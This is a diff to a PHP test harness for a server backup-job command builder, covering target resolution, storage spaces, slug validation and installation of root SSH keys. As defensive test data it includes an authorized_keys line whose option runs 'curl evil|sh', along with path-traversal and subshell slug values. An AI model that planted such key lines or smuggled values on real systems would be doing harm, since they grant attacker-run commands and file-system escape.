@@ -64,6 +64,9 @@ function jcb_current_vocabulary() {
 }
 
 function jcb_node(array $fields = array()) {
+	// backup_target_id: the node backs up to that target (its active storage space there).
+	$target_id = (int)($fields['backup_target_id'] ?? 0);
+	unset($fields['backup_target_id']);
 	$node = new ManagedNode(NULL);
 	$suffix = bin2hex(random_bytes(3));
 	$node->set('mgn_name', 'HarnessTest Node ' . $suffix);
@@ -92,7 +95,18 @@ function jcb_node(array $fields = array()) {
 	$node->save();
 	$node->load();
 	harness_register_row('mgn_managed_nodes', 'mgn_managed_node_id', $node->key);
+	if ($target_id) {
+		jcb_space($node, $target_id);
+	}
 	return $node;
+}
+
+/** The node's active storage space on a target, cleaned up after the run. */
+function jcb_space(ManagedNode $node, int $target_id): StorageSpace {
+	$space = StorageSpace::open(new BackupTarget($target_id, TRUE), StorageSpace::OWNER_NODE, (int)$node->key,
+		(string)$node->get('mgn_slug'));
+	harness_register_row('sps_storage_spaces', 'sps_storage_space_id', $space->key);
+	return $space;
 }
 
 // The fixture address gets its placement record here, once, registered for
@@ -871,7 +885,7 @@ section('Cloud credentials: placeholder-only (S-8) — no inline fallback exists
 // the job is handed out; the row at rest carries only the placeholder.
 $cloud_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/credmode/public_html',
-	'mgn_bkt_backup_target_id' => $bkt->key,
+	'backup_target_id' => $bkt->key,
 	'mgn_agent_public_key' => base64_encode(str_repeat("\x06", 32)),
 	'mgn_agent_version'    => AgentVocabulary::FLOOR,
 	'mgn_delete_local_after_upload' => false));
@@ -897,7 +911,7 @@ section('Fleet backup run: declared parameters, nothing secret at rest');
 // at all.
 $run_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/runnode/public_html',
-	'mgn_bkt_backup_target_id' => $bkt->key,
+	'backup_target_id' => $bkt->key,
 	'mgn_agent_public_key' => base64_encode(str_repeat("\x09", 32)),
 	'mgn_agent_version'    => AgentVocabulary::FLOOR));
 
@@ -915,17 +929,17 @@ try {
 		'mgn_agent_public_key' => base64_encode(str_repeat("\x0a", 32)),
 		'mgn_agent_version'    => AgentVocabulary::FLOOR)));
 } catch (Exception $e) { $threw = true; $refusal = $e->getMessage(); }
-check($threw && strpos($refusal, 'names no backup target') !== false,
-	'backup_run refuses a node that names no target, and says to choose one', $refusal);
+check($threw && strpos($refusal, 'has no backup storage') !== false,
+	'backup_run refuses a node with no backup storage, and says to move it to a target', $refusal);
 check(JobCommandBuilder::get_target(jcb_node(array('mgn_web_root' => '/var/www/html/inferred/public_html'))) === null,
-	'a node naming no target resolves to none: nothing is inferred from the enabled targets');
+	'a node with no storage space resolves to none: nothing is inferred from the enabled targets');
 
 // A named target still wins outright — inference never overrides a recorded
 // choice, and a node pointing at a switched-off shelf is refused rather than
 // silently redirected to whatever else happens to be enabled.
 $named = JobCommandBuilder::get_target(jcb_node(array(
 	'mgn_web_root' => '/var/www/html/named/public_html',
-	'mgn_bkt_backup_target_id' => $bkt->key)));
+	'backup_target_id' => $bkt->key)));
 check($named !== null && $named->key == $bkt->key, 'a named target is used as named');
 
 $off = new BackupTarget(NULL);
@@ -938,7 +952,7 @@ $off->save();
 harness_register_row('bkt_backup_targets', 'bkt_backup_target_id', $off->key);
 $off_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/offtarget/public_html',
-	'mgn_bkt_backup_target_id' => $off->key));
+	'backup_target_id' => $off->key));
 $read = JobCommandBuilder::get_target($off_node);
 check($read !== null && (int)$read->key === (int)$off->key,
 	'a switched-off target is still read: its backups stay listable, restorable and prunable');
@@ -957,31 +971,29 @@ $gone->set('bkt_credentials', json_encode(array('key_id' => 'k', 'application_ke
 $gone->set('bkt_enabled', true);
 $gone->save();
 harness_register_row('bkt_backup_targets', 'bkt_backup_target_id', $gone->key);
-$gone->soft_delete();
-check(JobCommandBuilder::get_target(jcb_node(array(
+$gone_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/gonetarget/public_html',
-	'mgn_bkt_backup_target_id' => $gone->key))) === null,
-	'a node naming a deleted target is refused, not handed the deleted target');
+	'backup_target_id' => $gone->key));
+$gone->soft_delete();
+check(JobCommandBuilder::get_target($gone_node) === null,
+	'a node whose space is on a deleted target is refused, not handed the deleted target');
 
 $threw = false;
 try {
 	JobCommandBuilder::build_backup_run(jcb_node(array(
-		'mgn_bkt_backup_target_id' => $bkt->key, 'mgn_web_root' => '')));
+		'backup_target_id' => $bkt->key, 'mgn_web_root' => '')));
 } catch (Exception $e) { $threw = true; }
 check($threw, 'backup_run refuses a node with no web root');
 
-// The slug becomes a bucket path segment, so it is constrained to a shape
-// rather than escaped and hoped for. Set without saving: the builder is pure,
-// and the claim is about the builder's own gate, not the model's.
+// The folder becomes a bucket path segment, so it is constrained to a shape
+// rather than escaped and hoped for: no storage space opens with one that is
+// not a plain name, and a run's slug and prefix are its space's.
+$slug_node = jcb_node(array('mgn_web_root' => '/var/www/html/badslug/public_html'));
 foreach (array($PAYLOAD, $SUBSHELL, 'has space', '../../etc') as $bad_slug) {
-	$slug_node = jcb_node(array(
-		'mgn_web_root' => '/var/www/html/badslug/public_html',
-		'mgn_bkt_backup_target_id' => $bkt->key));
-	$slug_node->set('mgn_slug', $bad_slug);
 	$threw = false;
-	try { JobCommandBuilder::build_backup_run($slug_node); }
-	catch (Exception $e) { $threw = true; }
-	check($threw, 'backup_run refuses the slug ' . var_export(substr($bad_slug, 0, 20), true));
+	try { StorageSpace::open($bkt, StorageSpace::OWNER_NODE, (int)$slug_node->key, $bad_slug); }
+	catch (StorageSpaceException $e) { $threw = true; }
+	check($threw, 'no storage space opens with the folder ' . var_export(substr($bad_slug, 0, 20), true));
 }
 
 // The happy path: a primitive envelope carrying the run config as declared
@@ -1054,7 +1066,7 @@ $obj_listing = array(
 JobCommandBuilder::set_shelf_listing_for_tests($obj_listing);
 $obj_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/objnode/public_html',
-	'mgn_bkt_backup_target_id' => $bkt->key,
+	'backup_target_id' => $bkt->key,
 	'mgn_agent_public_key' => base64_encode(str_repeat("\x0a", 32)),
 	'mgn_agent_version'    => AgentVocabulary::FLOOR));
 $obj_base = 'joinery-backups/' . $obj_node->get('mgn_slug') . '/manager/';
@@ -1078,7 +1090,7 @@ $below_threw = '';
 try {
 	JobCommandBuilder::build_backup_run(jcb_node(array(
 		'mgn_web_root' => '/var/www/html/belowrun/public_html',
-		'mgn_bkt_backup_target_id' => $bkt->key,
+		'backup_target_id' => $bkt->key,
 		'mgn_agent_public_key' => base64_encode(str_repeat("\x0c", 32)),
 		'mgn_agent_version'    => '1.37.0')));
 } catch (Exception $e) { $below_threw = $e->getMessage(); }
@@ -1089,7 +1101,7 @@ $bru_threw = '';
 try {
 	JobCommandBuilder::build_backup_run(jcb_node(array(
 		'mgn_web_root' => '/var/www/html/unpairedrun/public_html',
-		'mgn_bkt_backup_target_id' => $bkt->key)));
+		'backup_target_id' => $bkt->key)));
 } catch (Exception $e) { $bru_threw = $e->getMessage(); }
 check(strpos($bru_threw, 'paired agent') !== false,
 	'an unpaired node is refused backup_run and told to pair', $bru_threw);
@@ -1113,7 +1125,7 @@ foreach ($rk_cases as $label => $pair) {
 	list($rk_state, $rk_fpr) = $pair;
 	$rk_node = jcb_node(array(
 		'mgn_web_root' => '/var/www/html/nokey/public_html',
-		'mgn_bkt_backup_target_id' => $bkt->key,
+		'backup_target_id' => $bkt->key,
 		'mgn_last_status_data' => ($rk_state === '') ? null : json_encode(array('backup_recovery_state' => $rk_state)),
 		'mgn_backup_recovery_fpr' => $rk_fpr));
 
@@ -1149,7 +1161,7 @@ harness_register_row('bkt_backup_targets', 'bkt_backup_target_id', $bkt_split->k
 
 $split_node = jcb_node(array(
 	'mgn_web_root' => '/var/www/html/splitnode/public_html',
-	'mgn_bkt_backup_target_id' => $bkt_split->key,
+	'backup_target_id' => $bkt_split->key,
 	'mgn_agent_public_key' => base64_encode(str_repeat("\x07", 32)),
 	'mgn_agent_version'    => AgentVocabulary::FLOOR));
 
@@ -1191,7 +1203,7 @@ check(strpos($split_del_json, $main_token) === false && strpos($split_del_json, 
 $split_paired = jcb_node(array(
 	'mgn_web_root'             => '/var/www/html/splitnode/public_html',
 	'mgn_slug'                 => 'splitnode',
-	'mgn_bkt_backup_target_id' => $bkt_split->key,
+	'backup_target_id' => $bkt_split->key,
 	'mgn_agent_public_key'     => base64_encode(str_repeat("\x04", 32)),
 	'mgn_agent_version'        => AgentVocabulary::FLOOR));
 $split_download = JobCommandBuilder::build_download_backup($split_paired, array(
@@ -1877,13 +1889,33 @@ $wp15_hostile = 'command="curl evil|sh" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPyy
 $wp15_cmd = (string)(JobCommandBuilder::build_retire_install_password($retire_node, $wp15_ed . "\n" . $wp15_hostile . "\n# note\n\n")[0]['cmd'] ?? '');
 check(strpos($wp15_cmd, "'PermitRootLogin prohibit-password'") !== false && strpos($wp15_cmd, "authorized_keys") !== false,
 	'with keys: key login stays and the keys go to root\'s authorized_keys');
-check(strpos($wp15_cmd, base64_encode($wp15_ed)) !== false && strpos($wp15_cmd, 'curl evil') === false
+check(strpos($wp15_cmd, base64_encode($wp15_ed . "\n")) !== false && strpos($wp15_cmd, 'curl evil') === false
 	&& strpos($wp15_cmd, base64_encode($wp15_hostile)) === false,
 	'the keys travel base64, and a line with options is never installed');
 check(JobCommandBuilder::root_key_lines("ssh-rsa AAAB+/= c\nfrom=\"1.2.3.4\" ssh-rsa AAAB x\nnot a key") === array('ssh-rsa AAAB+/= c'),
 	'root_key_lines keeps bare keys only');
 exec('bash -n ' . escapeshellarg('/dev/stdin') . ' <<\'JCB_RETIRE2\'' . "\n" . $wp15_cmd . "\nJCB_RETIRE2\n", $wp15_out, $wp15_rc);
 check($wp15_rc === 0, 'the keyed script parses under bash -n', implode("\n", $wp15_out));
+
+// The key lines run for real against a scratch directory standing in for
+// /root/.ssh: a list of one key once wrote nothing (the last line had no
+// newline, and `read` dropped it) while the job reported success.
+$wp15_run = function ($keys) {
+	$dir = sys_get_temp_dir() . '/jcb_root_ssh_' . bin2hex(random_bytes(4));
+	$script = '';
+	foreach (explode("\n", (string)(JobCommandBuilder::build_retire_install_password(new ManagedNode(NULL), $keys)[0]['cmd'] ?? '')) as $line) {
+		if (strpos($line, 'sshd_config.d') !== false) { break; }
+		$script .= str_replace('/root/.ssh', $dir, $line) . "\n";
+	}
+	exec('bash -c ' . escapeshellarg($script) . ' 2>&1', $out, $rc);
+	$written = is_file($dir . '/authorized_keys') ? file($dir . '/authorized_keys', FILE_IGNORE_NEW_LINES) : array();
+	exec('rm -rf ' . escapeshellarg($dir));
+	return array($rc, $written);
+};
+$wp15_second = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHwB9w1bqf0m2YbqyS9W3E8lXk8zqNnS2P1ZgXo9oJ3x second@host';
+check($wp15_run($wp15_ed) === array(0, array($wp15_ed)), 'one key: it is written to root\'s authorized_keys');
+check($wp15_run($wp15_ed . "\n" . $wp15_second) === array(0, array($wp15_ed, $wp15_second)), 'two keys: both are written, the last one too');
+check($wp15_run($wp15_ed . "\n" . $wp15_ed) === array(0, array($wp15_ed)), 'a key given twice is written once');
 
 section('verify_backup: the same links as a Prepare, plus a level, and nothing destructive');
 
@@ -1900,7 +1932,7 @@ harness_register_row('bkt_backup_targets', 'bkt_backup_target_id', $verify_bkt->
 $verify_node = jcb_node(array(
 	'mgn_web_root'             => '/var/www/html/verifysite/public_html',
 	'mgn_slug'                 => 'verifysite',
-	'mgn_bkt_backup_target_id' => $verify_bkt->key,
+	'backup_target_id' => $verify_bkt->key,
 	'mgn_agent_public_key'     => base64_encode(str_repeat("\x03", 32)),
 	'mgn_agent_version'        => AgentVocabulary::FLOOR));
 $verify_target = JobCommandBuilder::get_target($verify_node);
@@ -1966,7 +1998,7 @@ if (!$verify_target) {
 	$old_node = jcb_node(array(
 		'mgn_web_root'             => '/var/www/html/oldsite/public_html',
 		'mgn_slug'                 => 'verifysite-old',
-		'mgn_bkt_backup_target_id' => $verify_bkt->key,
+		'backup_target_id' => $verify_bkt->key,
 		'mgn_agent_public_key'     => base64_encode(str_repeat("\x04", 32)),
 		'mgn_agent_version'        => '1.23.0'));
 	$threw = '';
@@ -2001,7 +2033,7 @@ if (!$verify_target) {
 	$objects_node = jcb_node(array(
 		'mgn_web_root'             => '/var/www/html/verifysite/public_html',
 		'mgn_slug'                 => 'verifysite-objects',
-		'mgn_bkt_backup_target_id' => $verify_bkt->key,
+		'backup_target_id' => $verify_bkt->key,
 		'mgn_agent_public_key'     => base64_encode(str_repeat("\x04", 32)),
 		'mgn_agent_version'        => AgentVocabulary::FLOOR));
 	$vbase = dirname(rtrim($oprefix, '/')) . '/';
@@ -2544,7 +2576,7 @@ $cp_bkt->save();
 harness_register_row('bkt_backup_targets', 'bkt_backup_target_id', $cp_bkt->key);
 $cp_source = jcb_node(array(
 	'mgn_slug'                 => 'copysrc-' . bin2hex(random_bytes(2)),
-	'mgn_bkt_backup_target_id' => $cp_bkt->key,
+	'backup_target_id' => $cp_bkt->key,
 	'mgn_agent_public_key'     => base64_encode(str_repeat("\x07", 32))));
 $cp_copy_key = base64_encode(str_repeat("\x08", 32));
 $cp_copy = jcb_node(array(
